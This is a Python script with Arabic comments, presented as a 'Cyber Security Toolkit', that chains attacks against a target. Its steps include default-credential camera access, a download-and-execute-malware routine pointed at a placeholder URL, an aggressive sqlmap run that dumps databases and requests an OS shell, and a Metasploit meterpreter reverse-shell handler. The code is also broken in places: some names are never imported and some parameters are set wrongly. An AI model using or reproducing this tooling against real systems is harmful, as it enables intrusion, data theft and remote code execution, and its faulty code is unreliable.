import os
import cv2
import socket
import pyaudio
import wave
import logging
import time
import subprocess
from datetime import datetime
from tqdm import tqdm
from urllib.parse import urlparse, parse_qs
from termcolor import colored
import shutil
import argparse
import requests
from scapy.all import sniff  # استدعاء محدد
from cryptography.fernet import Fernet
import hashlib
import sqlite3
import matplotlib.pyplot as plt
import seaborn as sns
import pexpect
from dnslib import DNSRecord

# ============================
# إعداد السجل
# ============================
LOG_FILE = 'cyber_tool_ultimate_log.txt'
logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# ============================
# قاعدة بيانات لتخزين النتائج
# ============================
DB_FILE = 'cyber_tool_results.db'
if not os.path.exists(DB_FILE):
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute("""
            CREATE TABLE results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                tool_name TEXT,
                target TEXT,
                result TEXT,
                timestamp TEXT
            )
        """)
        conn.commit()

def save_to_db(tool_name, target, result):
    """حفظ النتائج في قاعدة البيانات."""
    try:
        with sqlite3.connect(DB_FILE) as conn:
            cursor = conn.cursor()
            cursor.execute("INSERT INTO results (tool_name, target, result, timestamp) VALUES (?, ?, ?, ?)",
                           (tool_name, target, result, datetime.now()))
            conn.commit()
    except sqlite3.Error as e:
        logging.error(f"Error saving to database: {e}")

# ============================
# وظيفة تحليل الشبكات (Scapy)
# ============================
def analyze_network(target_ip):
    """تحليل الشبكة باستخدام Scapy."""
    try:
        print(colored(f"Analyzing network for {target_ip}", 'cyan'))
        packets = sniff(count=10, filter=f"ip host {target_ip}", timeout=10)
        for pkt in packets:
            print(pkt.summary())
        save_to_db("analyze_network", target_ip, "Packet capture complete.")
    except Exception as e:
        logging.error(f"Error analyzing network for {target_ip}: {e}")
        print(colored(f"Error analyzing network: {e}", 'red'))

# ============================
# وظيفة تشفير البيانات (Cryptography)
# ============================
def encrypt_data(data, key):
    """تشفير البيانات باستخدام Fernet."""
    try:
        fernet = Fernet(key)
        return fernet.encrypt(data.encode())
    except Exception as e:
        logging.error(f"Error encrypting data: {e}")
        raise

def decrypt_data(encrypted_data, key):
    """فك تشفير البيانات باستخدام Fernet."""
    try:
        fernet = Fernet(key)
        return fernet.decrypt(encrypted_data).decode()
    except Exception as e:
        logging.error(f"Error decrypting data: {e}")
        raise

# ============================
# وظيفة اختراق الكاميرا (ONVIF)
# ============================
def exploit_camera(ip, username, password):
    """استغلال الكاميرا باستخدام ONVIF."""
    try:
        mycam = ONVIFCamera(ip, 80, username, password, "/path/to/wsdl")
        info = mycam.devicemgmt.GetDeviceInformation()
        logging.info(f"[INFO] Exploited camera at {ip}: {info}")
        return True
    except Exception as e:
        logging.error(f"[ERROR] Failed camera exploit: {e}")
        return False

# ============================
# وظيفة تحميل وتشغيل البرمجيات الخبيثة
# ============================
def download_and_execute_malware(url, save_path):
    """تحميل وتشغيل البرمجيات الخبيثة."""
    try:
        response = requests.get(url, stream=True)
        with open(save_path, "wb") as file:
            for chunk in response.iter_content(chunk_size=8192):
                file.write(chunk)
        logging.info(f"[INFO] Malware downloaded: {save_path}")
        subprocess.run(save_path, shell=True)
        logging.info(f"[INFO] Malware executed: {save_path}")
    except Exception as e:
        logging.error(f"[ERROR] Failed to download or execute malware: {e}")

# ============================
# وظيفة فحص المنافذ باستخدام Nmap
# ============================
def port_scan(target):
    """فحص المنافذ باستخدام Nmap."""
    try:
        result = subprocess.run(["nmap", "-p-", "-A", target], capture_output=True, text=True)
        logging.info(f"[INFO] Port scan completed for {target}: {result.stdout}")
    except Exception as e:
        logging.error(f"[ERROR] Port scan failed: {e}")

# ============================
# وظيفة فحص حقن SQL باستخدام SQLMap
# ============================
def run_sqlmap(target):
    """فحص حقن SQL باستخدام SQLMap."""
    sqlmap_command = [
        "sqlmap", "-u", f"http://{target}/vulnerable.php?id=1", "--batch", "--level=5", "--risk=3",
        "--tamper=space2comment,charencode,randomcase,between", "--random-agent", "--crawl=10", "--threads=10",
        "--technique=BEUSTQ", "--time-sec=10", "--output-dir=sqlmap_output", "--dbs", "--dump-all", "--forms",
        "--smart", "--os-shell", "-p", "id", "--suffix=\" OR 1=1\""
    ]
    try:
        subprocess.run(sqlmap_command, capture_output=True)
        logging.info("[INFO] SQLMap scan completed.")
    except Exception as e:
        logging.error(f"[ERROR] SQLMap execution failed: {e}")

# ============================
# وظيفة فحص برمجيات Burp Suite
# ============================
def burp_suite_attack(target_url):
    """استخدام Burp Suite لتحليل وتعديل الطلبات."""
    try:
        # يجب أن يكون Burp Suite يعمل مسبقًا على جهازك
        burp_command = f"java -jar burpsuite_pro.jar -I --target {target_url}"
        result = subprocess.run(burp_command, capture_output=True, text=True)
        logging.info(f"[INFO] Burp Suite Attack Result: {result.stdout}")
        return result.stdout
    except Exception as e:
        logging.error(f"[ERROR] Failed to execute Burp Suite: {e}")
        return None

# ============================
# وظيفة استخدام Metasploit
# ============================
def metasploit_attack(target):
    """استخدام Metasploit لاستغلال الثغرات على الهدف."""
    msf = pexpect.spawn('msfconsole', encoding='utf-8')
    msf.expect('msf6 > ')
    msf.sendline(f"use exploit/multi/handler")
    msf.expect('msf6 exploit(multi/handler) > ')
    msf.sendline(f"set PAYLOAD windows/meterpreter/reverse_tcp")
    msf.sendline(f"set LHOST {target}")
    msf.sendline(f"set LPORT 4444")
    msf.sendline("run")
    msf.interact()

# ============================
# وظيفة توليد تقرير JSON
# ============================
def generate_report(data, filename="report.json"):
    """توليد تقرير JSON."""
    try:
        with open(filename, "w") as f:
            json.dump(data, f, indent=4)
        logging.info(f"[INFO] Report generated: {filename}")
    except Exception as e:
        logging.error(f"[ERROR] Failed to generate report: {e}")

# ============================
# الوظيفة الرئيسية
# ============================
def main():
    parser = argparse.ArgumentParser(description="Cyber Security Toolkit")
    parser.add_argument("-t", "--target", help="Specify the target IP or URL", required=True)
    args = parser.parse_args()

    target = args.target
    results = {}

    # تحليل الشبكة
    analyze_network(target)

    # تشفير البيانات
    key = Fernet.generate_key()
    print(f"Encryption key: {key.decode()}")
    data = input("Enter data to encrypt: ")
    encrypted_data = encrypt_data(data, key)
    print(f"Encrypted data: {encrypted_data}")
    decrypted_data = decrypt_data(encrypted_data, key)
    print(f"Decrypted data: {decrypted_data}")

    # اختراق الكاميرا
    camera_ip = "192.168.1.10"
    camera_username = "admin"
    camera_password = "password"
    if exploit_camera(camera_ip, camera_username, camera_password):
        results["Camera"] = f"Exploited at {camera_ip}"

    # تحميل وتشغيل البرمجيات الخبيثة
    malware_url = "http://example.com/malware.exe"
    save_path = "/tmp/malware.exe"
    download_and_execute_malware(malware_url, save_path)

    # فحص المنافذ
    port_scan(target)

    # فحص حقن SQL
    run_sqlmap(target)

    # تحليل Burp Suite
    burp_result = burp_suite_attack(target)
    if burp_result:
        results["Burp Suite"] = "Burp Suite analysis completed."

    # استخدام Metasploit
    metasploit_attack(target)

    # توليد تقرير
    generate_report(results)

if __name__ == "__main__":
    main()
